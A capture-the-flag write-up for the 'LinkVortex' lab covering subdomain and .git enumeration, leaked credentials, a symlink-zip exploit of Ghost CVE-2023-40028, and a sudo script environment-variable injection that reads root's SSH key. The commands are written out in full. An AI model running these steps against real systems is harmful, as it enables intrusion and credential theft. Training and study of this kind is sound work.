## LinkVortex

### Lab Details 

- Difficulty: Easy
- Type: Web App, Git, Ghost CMS, Priv Esc, Linux

#### Tasks
Q1: How many open TCP ports are listening on LinkVortex?
- run nmap `-sT -T4 -vv -A -p- -Pn -oA LinkVortex 10.10.11.47`
- 2 ports
```
PORT      STATE    SERVICE        REASON      VERSION
22/tcp    open     ssh            syn-ack     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=
|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz
80/tcp    open     http           syn-ack     Apache httpd
|_http-generator: Ghost 5.58
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
| http-methods: 
|_  Supported Methods: POST GET HEAD OPTIONS
|_http-favicon: Unknown favicon MD5: A9C6DBDCDC3AE568F4E0DAD92149A0E3
|_http-server-header: Apache
|_http-title: BitByBit Hardware

```
Q2: What subdomain of linkvortex.htb returns a differt application from the main site?
 - run ffuf against target
 - vhost: `dev.linkvortex.htb`
```
$: ffuf -w /usr/share/amass/wordlists/bitquark_subdomains_top100K.txt -H "Host:
FUZZ.linkvortex.htb" -u http://linkvortex.htb/ -fc 301


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb/
 :: Wordlist         : FUZZ: /usr/share/amass/wordlists/bitquark_subdomains_top100K.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 319ms]
<snip>
```
Q3: What is the name of the directory that is exposed on the dev subdomain that allows access to the site's source code?
- run ffuf again against the found vhost, 
- we found `.git` 
- git usually contains app codes 
```
$ ffuf -u http://dev.linkvortex.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.linkvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.git/HEAD               [Status: 200, Size: 41, Words: 1, Lines: 2, Duration: 317ms]
<snip>
```
- we can try download `.git` to our end and investigate further
- found a great article on explaining how to enumerate git: https://medium.com/stolabs/git-exposed-how-to-identify-and-exploit-62df3c165c37
```
$: wget --mirror -I .git  http://dev.linkvortex.htb/.git/
```
Q4: What is the bob user's password for the Ghost admin panel?
- we can check a couple of things, first thing ive checked is `git status`
```
 git status 
Not currently on any branch.
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        new file:   Dockerfile.ghost
        modified:   ghost/core/test/regression/api/admin/authentication.test.js

Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    .editorconfig
<snip>
```
- the modified file named authentication.test.js looks interesting
- upon further investigation it contains the password 
```
$ cat ghost/core/test/regression/api/admin/authentication.test.js               
<snip>
        it('complete setup', async function () {
            const email = 'test@example.com';
            const password = 'OctopiFociPilfer45';

            const requestMock = nock('https://api.github.com')
<snip>
```
Q5: What version of Ghost running on LinkVortex?
- looking through files, found the version in Dockerfile.ghost
```
 cat Dockerfile.ghost 
FROM ghost:5.58.0

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json

# Prevent installing packages
RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb

# Wait for the db to be ready first
COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
COPY entry.sh /entry.sh
RUN chmod +x /var/lib/ghost/wait-for-it.sh
RUN chmod +x /entry.sh

ENTRYPOINT ["/entry.sh"]
CMD ["node", "current/index.js"]
```
Q6: What is the 2023 CVE ID for an authenticated file read vulnerability in this version of Ghost?
- search for Ghost 5.58.0 exploit, found: https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028


Q7: What is the full path of the Ghost configuration file that contains an exposed password?
 - according to this blog, Ghost stores information about itself in a file called `config.production.json` : `https://blog.vkhitrin.com/understanding-self-hosted-ghost-data-structure/`
 - wasnt straight forward in locating the file, the default location is at `/var/www/ghost` however thats not the case for target config
 - i found another POC for the vulnerability and found that the file is located at a custom location `/var/lib/ghost/config.production.json`
 - and found a feature request about custom location for json files on github: https://github.com/docker-library/ghost/issues/73



Q8: What is the bob user's password on LinkVortex?
- according to the POC: https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028
- the POC is trying to upload a zip file with a linked file to the file attacker wants to read
- need to figure out where to upload and where to fetch
- tried to upload a new profile picture and found the image storage location at http://linkvortex.htb/content/images/2025/06/Cat03-1.jpg
- looking around the site and there is a location to upload a zipped file http://linkvortex.htb/ghost/#/settings/labs
- tried to work with the POC however no luck then tried uploading manually 
- example on generating the payload
```
$: mkdir mkdir -p exploit/content/images/
$: ln -s /var/lib/ghost/config.production.json exploit/content/images/cat02.png
$: zip -r -y exploit.zip exploit/
```
- then upload the exploit to http://linkvortex.htb/ghost/#/settings/labs/import/
- fetch the file from remote
```
$ curl http://linkvortex.htb/content/images/Cat02.jpg 
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```
Q10: Which is the name of the script that bob execute as any user without providing a password?
- run sudo -l
- user bob can run `/usr/bin/bash /opt/ghost/clean_symlink.sh *.png` as root without password
```
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png

```

Q11: What is the full path of the SSH private key file for the root user?
- there is a script file that the shell is executing 
```
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```
- initially i thought i need to create a double symbolic link file to point to the `/root/.ssh/id_rsa` as there is a safeguard for reading files in /etc and /root
- however it did not work but a variable caught my attention
- the nested else statement is checking `$CHECK_CONTENT`, the way the if statement is written will not only check for true or false but also execute anything inside the `$CHECK_CONTENT` variable 
- we can inject a command and it will be run as root 
```
## declare $CHECK_CONTENT in shell
## can display root's id_rsa ssh secret key
$: export CHECK_CONTENT="cat /root/.ssh/id_rsa"
## or 
## display the root.txt directly
$: export CHECK_CONTENT="cat /root/root.txt"
## create a symbolic link file as its require by the script
$: ln -s /home/bob/user.txt id_rsa.png
bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
/opt/ghost/clean_symlink.sh: line 5: [: cat: binary operator expected
Link found [ id_rsa.png ] , moving it to quarantine
-----BEGIN OPENSSH PRIVATE KEY-----
<snip>
```
#### Resources
- found another POC for Ghost CVE-2023-40028: https://github.com/godylockz/CVE-2023-40028/tree/main (this might work, did not test as time of writing) 
- file used to scan for vhost(on Kali): `/usr/share/amass/wordlists/bitquark_subdomains_top100K.txt`



#### Lesson Learned
